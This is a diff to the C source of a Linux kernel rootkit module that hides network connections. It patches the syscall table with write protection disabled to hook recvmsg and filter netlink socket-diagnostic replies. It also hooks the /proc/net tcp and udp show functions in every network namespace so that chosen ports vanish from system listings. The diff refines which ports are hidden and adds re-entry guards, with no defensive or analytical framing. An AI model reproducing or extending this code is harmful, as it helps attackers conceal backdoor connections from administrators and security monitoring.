@@ -91,11 +91,8 @@ static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
 				sport = htons(diag_msg->id.idiag_sport);
 				dport = htons(diag_msg->id.idiag_dport);
 		
-				//printk(KERN_INFO "s: %d\n", sport);
 				
 				if(in_tcplist(sport)){ //don't hide target ports...
-				//	printk(KERN_INFO "hiding port %d", sport);
-					
 					lres -= NLMSG_ALIGN((nlh)->nlmsg_len);
 					nxt = NLMSG_NEXT(nlh, msglen);
 					memmove(nlh, nxt, msglen); //shift entries
@@ -103,7 +100,6 @@ static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
 				else{
 					nlh = NLMSG_NEXT(nlh, msglen);
 				}
-				//printk(KERN_INFO "---------------------------\n");
 				}while(NLMSG_OK(nlh, msglen));
 			if(lres == 0){// no valid message left
 				nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
@@ -125,7 +121,7 @@ static int my_tcp_seq_show(struct seq_file * m, void * v){
 	struct inet_sock * inet;
 	struct sock * sp = v;
 	struct tcp_iter_state *st;
-	__u16 srcp, dstp;	
+	__u16 srcp;	
 
 	if (v == SEQ_START_TOKEN){
 		return orig_tcp_seq_show(m, v);
@@ -133,9 +129,8 @@ static int my_tcp_seq_show(struct seq_file * m, void * v){
 	else{
 		inet = inet_sk(sp);
 		srcp = ntohs(inet->inet_sport);
-		dstp = ntohs(inet->inet_dport);
-		if(in_tcplist(srcp) || in_tcplist(dstp)){
-			st = m->private;
+		if(in_tcplist(srcp)){ //tcp port list counts rows
+			st = m->private; 
 			st->num -= 1;
 			return 0;
 		}
@@ -148,16 +143,15 @@ static int my_tcp_seq_show(struct seq_file * m, void * v){
 static int my_udp_seq_show(struct seq_file * m, void * v){
 	struct inet_sock * inet;
 	struct sock * sp = v;
-	__u16 srcp, dstp;
+	__u16 srcp;
 	
 	if (v == SEQ_START_TOKEN)
 		return orig_udp_seq_show(m,v);
 	else {
 		inet = inet_sk(sp);
 		srcp = ntohs(inet->inet_sport);
-		dstp = ntohs(inet->inet_dport);
 		
-		if(in_udplist(srcp) || in_udplist(dstp)){
+		if(in_udplist(srcp)){
 			return 0;
 		}
 		return orig_udp_seq_show(m,v);
@@ -165,7 +159,9 @@ static int my_udp_seq_show(struct seq_file * m, void * v){
 			
 	return 0;
 }
-
+/* 
+* Auxiliary function to find the proc_dir_entry of a file in every subdir
+*/
 struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name){
 	struct proc_dir_entry* result = pde->subdir;
  	while(result && strcmp(name, result->name)) {
@@ -181,38 +177,43 @@ void hide_sockets(void){
 	struct net * net_ns;
 	struct tcp_seq_afinfo * tcp_info;
 	struct udp_seq_afinfo * udp_info;
-	
-	list_for_each_entry(net_ns, &net_namespace_list, list){
-				
-		net_dent = net_ns->proc_net;
-		tcp_dent = get_pde_subdir(net_dent, "tcp");
-		udp_dent = get_pde_subdir(net_dent, "udp");
-		tcp_info = tcp_dent->data;
-		udp_info = udp_dent->data;
+	if(is_hidden == 0){
+		list_for_each_entry(net_ns, &net_namespace_list, list){
+					
+			net_dent = net_ns->proc_net;
+			tcp_dent = get_pde_subdir(net_dent, "tcp");
+			udp_dent = get_pde_subdir(net_dent, "udp");
+			tcp_info = tcp_dent->data;
+			udp_info = udp_dent->data;
 
-		tcp_hook_ptr = (void**) &tcp_info->seq_ops.show;
-		orig_tcp_seq_show = *tcp_hook_ptr;
-		*tcp_hook_ptr = my_tcp_seq_show;
+			/*Get show function pointers of the tcp and udp files
+			* and hook them.
+			*/
+			tcp_hook_ptr = (void**) &tcp_info->seq_ops.show;
+			orig_tcp_seq_show = *tcp_hook_ptr;
+			*tcp_hook_ptr = my_tcp_seq_show;
 
-		udp_hook_ptr = (void**) &udp_info->seq_ops.show;
-		orig_udp_seq_show = *udp_hook_ptr;
-		*udp_hook_ptr = my_udp_seq_show;
-  	}
+			udp_hook_ptr = (void**) &udp_info->seq_ops.show;
+			orig_udp_seq_show = *udp_hook_ptr;
+			*udp_hook_ptr = my_udp_seq_show;
+		}
 
-	disable_wp();
-	orig_sys_recvmsg = syscall_table[__NR_recvmsg];
-	syscall_table[__NR_recvmsg] = my_sys_recvmsg;
-	enable_wp();
-	is_hidden = 1;
+		disable_wp();
+		orig_sys_recvmsg = syscall_table[__NR_recvmsg];
+		syscall_table[__NR_recvmsg] = my_sys_recvmsg;
+		enable_wp();
+		is_hidden = 1;
+	}
 }
 
 
 void unhide_sockets(void){
 	*udp_hook_ptr = orig_udp_seq_show;
 	*tcp_hook_ptr = orig_tcp_seq_show;
-
-	disable_wp();
-	syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
-	enable_wp();
-	is_hidden = 0;
+	if(is_hidden == 1){
+		disable_wp();
+		syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
+		enable_wp();
+		is_hidden = 0;
+	}
 }
